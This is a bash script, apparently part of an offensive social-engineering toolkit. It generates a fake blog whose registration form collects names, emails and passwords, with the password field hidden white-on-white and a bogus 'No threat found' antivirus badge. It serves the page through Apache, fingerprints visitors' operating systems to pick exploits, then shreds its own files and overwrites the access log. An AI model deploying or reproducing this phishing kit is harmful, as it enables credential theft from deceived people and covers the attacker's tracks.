#!/bin/bash

bar ()
{
BAR='*0*1*0*1*0*1*0*1*0*1*0*1 \e[00;34m !'    
                         
for i in {0..59}; do
    echo -ne "\r${BAR:0:$i}" 
    sleep 0.05
done
}

echo " "

echo -e "\e[01;33mIn this social engineering cignotrack module, you can test human security in: "
echo " "
echo -e "\e[01;34mFind target OS and collect possible email and password style\e[00m"
echo " "

bar
echo " "

echo " "
sudo echo -e "\e[01;34mCreating an interesting scam-page for the target\e[00m"
sleep 0.7

echo -e "\e[01;32mThe idea is contact the target with a pretext like:
\e[00m----------
\e[00;33m- Make believe we are customers and we have a blog (the scam page) where we have reviewed the organization
\e[00m----------
\e[01;31mThis scenario try to exploit the curiosity of the target\e[00m"


echo " "
echo -e "\e[00;34mWhen the target visit the fake page it's easy extract the OS used.
\e[00;32mAfter the fake blog requires a registration for see the content, so
you can collect a name, email and a password that be helpful for understand the key-style."
echo " "
bar
echo " "
echo "Insert title for the fake blog: "
read argom
echo "Insert description for the registration for the blog: "
read desc
echo "Insert background image (placed in this directory) "
read immag

cat > index.html << EOF
<form action="processo.php" method="POST">
<body background="$immag">
<p>=========================</p>

<h1 align=center style="color:blue;">$argom</h1>

<p class="big">
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
 <br>
 <br>
</p>
 
<p style="color:red;">$desc</p>

<p>=========================</p>

    <input name="field1" type="text" placeholder="Name"/>

<p>---</p>
    <input name="field2" type="text" placeholder="Email"/>
<p>    
    Password:<br>
    <input name="field3" type="text" STYLE="background-color:white; color: #FFFFFF" placeholder="Password"/>
    
    <input type="submit" name="submit" value="Go">
</form>


<p class="big">
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
  <br>
 <br>
</p>

<div class="alert">
  <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> 
  <strong>Secure!</strong> No threat found by htmlcode-antivirus * auto websag service label for your security
</div>

</body>
</html>

<p>---</p>

</form>
EOF

pwd > dir.txt
backd=$(cat dir.txt)

cp * /var/www/html
cd /var/www/html
shred -n 7 -u -z event.sh > /dev/null
shred -u -z dir.txt > /dev/null
cd $backd

shred -u dir.txt > /dev/null

chown -R root /var/www/html
chmod 755 /var/www/html

service apache2 restart
sleep 2

echo " "
echo -e "\e[00;33mAll data in apache log will be erased, press ENTER\e[00m: "
read
echo "DEVICE CONNECTED: " > /var/log/apache2/access.log
sleep 1
echo " "
xterm -e tail -f /var/log/apache2/access.log &
echo -e "\e[01;32mWhen you see contacts press ENTER\e[00m: "
read 
sleep 2
killall xterm

cat /var/log/apache2/access.log | grep -Eio "Linux" > linuxos.txt
cat /var/log/apache2/access.log | grep -Eio "Windows" > wos.txt
cat /var/log/apache2/access.log | grep -Eio "Macintosh" > macos.txt

echo -e "\e[01;33mTarget OS: "
echo " "
echo -e "\e[00;33m"
cat linuxos.txt && cat wos.txt && cat macos.txt
echo " "
echo -e "\e[00m"

echo -e "\e[00;31mRemember! Expose the OS type tell to the attacker wich exploit/malware to use!"
echo " "
rm linuxos.txt && rm wos.txt && rm macos.txt

cd
cd /tmp
ls > prl.txt
cat prl.txt | grep apache2 > ap.txt
dire=$(cat ap.txt)
cd $dire
cd tmp


echo -e "\e[01;32mTracking email and password used...\e[00m"
sleep 0.5
echo -e "\e[00;31m"
bar
echo " "
sleep 0.2
echo " "
echo -e "\e[01;36m"
cat mydata.txt
echo -e "\e[00m"
echo " "
service apache2 stop
echo " "

echo -e "\e[01;32mFinish\e[00m"

